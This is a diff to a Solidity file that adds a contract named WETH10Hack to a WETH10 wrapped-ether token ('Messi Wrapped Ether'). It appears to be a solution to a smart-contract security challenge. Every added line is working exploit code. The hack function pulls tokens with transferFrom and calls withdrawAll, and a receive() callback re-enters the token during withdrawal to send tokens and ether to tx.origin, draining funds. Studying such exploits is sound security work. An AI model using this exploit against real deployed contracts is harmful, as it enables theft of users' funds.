@@ -44,3 +44,15 @@ contract WETH10 is ERC20("Messi Wrapped Ether", "WETH10"), ReentrancyGuard {
         );
     }
 }
+
+contract WETH10Hack {
+    function hack(WETH10 weth10) external payable {
+        weth10.transferFrom(msg.sender, address(this), 1 ether);
+        weth10.withdrawAll();
+    }
+
+    receive() payable external {
+        WETH10(payable(msg.sender)).transfer(tx.origin, 1 ether);
+        payable(tx.origin).transfer(1 ether);
+    }
+}
